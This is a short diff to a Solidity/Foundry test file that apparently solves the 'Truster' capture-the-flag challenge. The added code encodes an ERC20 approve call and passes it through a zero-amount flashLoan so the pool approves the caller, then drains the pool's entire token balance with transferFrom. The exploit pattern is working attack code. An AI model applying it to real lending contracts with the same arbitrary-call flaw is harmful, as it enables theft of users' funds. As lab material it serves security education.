@@ -37,7 +37,14 @@ contract Truster is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        uint256 poolBalance = dvt.balanceOf(address(trusterLenderPool));
+        bytes memory approvePayload = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this),
+            poolBalance
+        );
+        trusterLenderPool.flashLoan(0, attacker, address(dvt), approvePayload);
+        dvt.transferFrom(address(trusterLenderPool), attacker, poolBalance);
         /** EXPLOIT END **/
         validation();
     }
